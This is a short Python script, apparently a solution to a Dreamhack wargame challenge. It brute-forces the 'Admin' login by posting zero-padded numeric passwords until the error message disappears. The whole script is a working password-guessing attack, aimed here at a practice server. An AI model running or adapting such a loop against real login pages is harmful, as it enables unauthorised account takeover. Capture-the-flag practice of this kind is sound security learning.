import requests

host = 'http://host8.dreamhack.games:19306/login'
TESTVAL = "ID or Password is incorrect!"
datas = {
    "id":"Admin",
    "pw": ""
}
for i in range(0,2000):
    datas['pw'] = str(i).zfill(5)
    print(datas['pw'])
    response = requests.post(host, data=datas)

    if TESTVAL not in response.text:
        print('pw is {0}'.format(datas['pw']))
        break
